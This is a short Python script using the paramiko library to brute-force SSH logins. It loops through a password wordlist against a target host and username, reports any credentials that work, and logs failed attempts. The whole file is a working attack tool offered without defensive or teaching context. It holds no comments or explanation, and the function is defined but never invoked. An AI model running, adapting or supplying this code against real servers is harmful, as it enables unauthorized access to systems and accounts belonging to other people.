#!/usr/bin/python3
import paramiko
import time

def ssh_brute(target, username, wordlist):
    with open(wordlist, "r") as passwords:
        for password in passwords:
            password = password.strip()

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(target, username=username, password=password)
                print(f'[+] Credentials found! Username: {username}, Password: {password}')
                ssh.close()  
                return True
            except paramiko.AuthenticationException:
                print(f"[-] Failed password: {password}")
            except paramiko.SSHException:
                print(f"[-] Connection error with {target}")
                time.sleep(5)  
            except Exception as e:
                print(f"[-] Unknown error: {e}")
                time.sleep(5)  
            finally:
                ssh.close()  


        print("[-] No valid credentials found.")
        return False


